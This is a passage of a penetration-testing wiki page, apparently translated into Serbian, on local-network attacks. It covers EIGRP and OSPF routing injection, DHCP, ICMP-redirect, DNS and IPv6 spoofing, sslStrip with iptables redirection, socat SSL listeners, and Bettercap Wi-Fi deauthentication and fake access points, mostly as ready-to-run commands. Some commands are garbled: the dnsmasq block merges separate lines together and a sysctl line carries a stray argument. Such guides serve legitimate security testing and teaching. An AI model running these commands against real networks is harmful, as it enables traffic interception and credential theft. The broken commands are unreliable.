**FHRP** (First Hop Redundancy Protocol) je klasa mrežnih protokola dizajniranih da **uspostave aktivni redundantni sistem rutiranja**. Sa FHRP-om, fizički ruteri se mogu kombinovati u jedan logički uređaj, što povećava toleranciju na greške i pomaže raspodelu opterećenja.

**Inženjeri Cisco Systems su razvili dva FHRP protokola, GLBP i HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Poznate su tri verzije Routing Information Protocol-a (RIP): RIP, RIPv2 i RIPng. Datagrami se šalju peer-ovima preko porta 520 koristeći UDP kod RIP i RIPv2, dok se kod RIPng datagrami broadcast-uju na UDP port 521 putem IPv6 multicast-a. RIPv2 je uveo podršku za MD5 autentikaciju. Sa druge strane, RIPng ne uključuje native autentikaciju; umesto toga oslanja se na opcione IPsec AH i ESP zaglavlja u okviru IPv6.

- **RIP and RIPv2:** Komunikacija se obavlja putem UDP datagrama na portu 520.
- **RIPng:** Koristi UDP port 521 za broadcast datagrama putem IPv6 multicast-a.

Napomena: RIPv2 podržava MD5 autentikaciju dok RIPng ne uključuje native autentikaciju, oslanjajući se na IPsec AH i ESP zaglavlja u IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** je dinamički routing protokol. **To je distance-vector protokol.** Ako nema **autentikacije** i konfigurisanih passive interfejsa, **napadač** može ometati EIGRP rutiranje i prouzrokovati **trovanje tabela rutiranja**. Štaviše, EIGRP mreža (drugim rečima, autonomni sistem) je ravna i nema segmentaciju u zone. Ako napadač ubaci rutu, verovatno će se ta ruta proširiti kroz ceo autonomni EIGRP sistem.

Za napad na EIGRP sistem potrebno je uspostaviti susedstvo sa legitimnim EIGRP ruterom, što otvara mnogo mogućnosti, od osnovnog izviđanja do raznih injekcija.

[**FRRouting**](https://frrouting.org/) vam omogućava da implementirate virtualni ruter koji podržava BGP, OSPF, EIGRP, RIP i druge protokole. Sve što treba da uradite je da ga deploy-ujete na sistemu napadača i možete se zapravo predstaviti kao legitimni ruter u routing domenu.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) ima mogućnosti za presretanje EIGRP (Enhanced Interior Gateway Routing Protocol) broadcast-ova. Takođe omogućava ubacivanje paketa, što se može iskoristiti za menjanje routing konfiguracija.

### OSPF

U Open Shortest Path First (OSPF) protokolu se često koristi MD5 autentikacija kako bi se obezbedila sigurna komunikacija između rutera. Međutim, ova mera bezbednosti može biti kompromitovana korišćenjem alata kao što su Loki i John the Ripper. Ovi alati su sposobni da presretnu i razbiju MD5 heševe, otkrivajući autentikacioni ključ. Kada se dođe do tog ključa, on se može iskoristiti za unošenje novih informacija o rutiranju. Za podešavanje parametara rute i uspostavljanje kompromitovanog ključa koriste se kartice _Injection_ i _Connection_, respektivno.

- **Presretanje i razbijanje MD5 heševa:** Alati kao što su Loki i John the Ripper se koriste u tu svrhu.
- **Podešavanje parametara rute:** To se radi kroz karticu _Injection_.
- **Postavljanje kompromitovanog ključa:** Ključ se konfiguriše pod karticom _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Alat za skeniranje mrežnog saobraćaja i pronalaženje ranjivosti
- Više informacija o mrežnim napadima možete pronaći [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Napadač konfiguriše sve mrežne parametre (GW, IP, DNS) novog člana mreže slanjem lažnih DHCP odgovora.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Pogledajte [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect se sastoji u slanju ICMP packet type 1 code 5 koji označava da attacker predstavlja najbolji put za dolazak do IP-a. Zatim, kada victim želi da kontaktira IP, paket će biti poslat preko attackera.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Napadač će razrešiti neke (ili sve) domene koje žrtva zatraži.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Podesite sopstveni DNS sa dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokalni gateway-i

Često postoji više puteva do sistema i mreža. Nakon sastavljanja liste MAC addresses u lokalnoj mreži, koristite _gateway-finder.py_ da identifikujete hosts koji podržavaju IPv4 forwarding.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Za lokalno rešavanje host imena kada DNS upiti ne uspeju, Microsoft sistemi se oslanjaju na **Link-Local Multicast Name Resolution (LLMNR)** i **NetBIOS Name Service (NBT-NS)**. Slično tome, implementacije **Apple Bonjour** i **Linux zero-configuration** koriste **Multicast DNS (mDNS)** za otkrivanje sistema u okviru mreže. Zbog neautentifikovane prirode ovih protokola i njihovog rada preko UDP-a, putem broadcast poruka, oni se mogu iskoristiti od strane napadača koji žele da preusmere korisnike na zlonamerne servise.

Možete se lažno predstavljati kao servisi koje hostovi traže koristeći Responder da pošaljete lažne odgovore.\
Pročitajte više o tome [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Pretraživači često koriste **Web Proxy Auto-Discovery (WPAD)** za automatsko dobijanje proxy podešavanja. Ovo podrazumeva preuzimanje konfiguracionih detalja sa servera, konkretno putem URL-a kao što je "http://wpad.example.org/wpad.dat". Otkrivanje ovog servera od strane klijenata može se dogoditi kroz različite mehanizme:

- Kroz **DHCP**, gde se otkrivanje obezbeđuje korišćenjem posebnog unosa sa kodom 252.
- Putem **DNS**, što uključuje pretragu host imena označenog kao _wpad_ unutar lokalnog domena.
- Preko **Microsoft LLMNR and NBT-NS**, koji služe kao fallback mehanizmi kada DNS upiti ne uspeju.

Alat Responder iskorišćava ovaj protokol tako što se ponaša kao **malicious WPAD server**. Koristi DHCP, DNS, LLMNR i NBT-NS da navede klijente da se povežu na njega. Za dublje razumevanje kako servisi mogu biti lažno predstavljeni koristeći Responder, [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Možete ponuditi različite usluge u mreži kako biste pokušali da **trick a user** da unese neke **plain-text credentials**. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

IPv6 Neighbor Spoofing

This attack is very similar to ARP Spoofing but in the IPv6 world. You can get the victim think that the IPv6 of the GW has the MAC of the attacker.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Neki OS-ovi podrazumevano konfigurišu gateway iz RA paketa poslatih na mreži. Da biste proglasili napadača za IPv6 router možete koristiti:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Po defaultu, neki OS pokušavaju da konfigurišu DNS čitajući DHCPv6 paket u mreži. Zatim, an attacker može poslati DHCPv6 paket i postaviti sebe kao DNS. DHCP takođe dodeljuje IPv6 to the victim.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## Internet Attacks

### sslStrip

U suštini, ono što ovaj napad radi jeste da, u slučaju da **user** pokuša da **access** **HTTP** stranicu koja se **redirecting** na **HTTPS** verziju. **sslStrip** će **maintain** **HTTP connection with** **client and** **HTTPS connection with** **server**, pa će moći da **sniff** konekciju u **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy za zaobilaženje HSTS

The **difference** between **sslStrip+ and dns2proxy** against **sslStrip** is that they will **redirect** for example _**www.facebook.com**_ **to** _**wwww.facebook.com**_ (note the **extra** "**w**") and will set the **address of this domain as the attacker IP**. This way, the **client** will **connect** to _**wwww.facebook.com**_ **(the attacker)** but behind the scenes **sslstrip+** will **maintain** the **real connection** via https with **www.facebook.com**.

The **goal** of this technique is to **avoid HSTS** because _**wwww**.facebook.com_ **won't** be saved in the **cache** of the browser, so the browser will be tricked to perform **facebook authentication in HTTP**.\
Note that in order to perform this attack the victim has to try to access initially to [http://www.faceook.com](http://www.faceook.com) and not https. This can be done modifying the links inside an http page.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP slušanje na portu
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL listen in port

#### Generisanje keys i self-signed certificate
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Slušanje pomoću sertifikata
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Slušanje koristeći certificate i preusmeravanje na hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Ponekad, ako client proverava da li je CA validan, možete **serve a certificate of other hostname signed by a CA**.\
Još jedan interesantan test je da poslužite c**ertificate of the requested hostname but self-signed**.

Ostale stvari za testiranje su pokušaj da potpišete certificate sa validnim certificate koji nije validan CA. Ili da koristite validan public key, forsirate upotrebu algoritma kao diffie hellman (onaj koji ne zahteva dekriptovanje ničega stvarnim private key-om) i kada client zahteva probe stvarnog private key-a (kao hash) pošaljete lažnu probe i očekujete da client to ne proverava.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Napomene o aktivnom otkrivanju

Imajte u vidu da kada se UDP paket pošalje uređaju koji nema traženi port, šalje se ICMP (Port Unreachable).

### **ARP otkrivanje**

ARP paketi se koriste za otkrivanje koji IP-ovi se koriste unutar mreže. PC mora poslati zahtev za svaku moguću IP adresu i samo oni koji se koriste će odgovoriti.

### **mDNS (multicast DNS)**

Bettercap šalje MDNS zahtev (svakih X ms) tražeći **\_services\_.dns-sd.\_udp.local**. Mašina koja vidi ovaj paket obično odgovori na ovaj zahtev. Zatim traži samo mašine koje odgovaraju na "services".

**Alati**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap šalje broadcast pakete na port 137/UDP tražeći ime "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap šalje SSDP broadcast pakete u potrazi za svim vrstama servisa (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap šalje WSD broadcast pakete tražeći servise (UDP Port 3702).


### Telecom / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## References

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
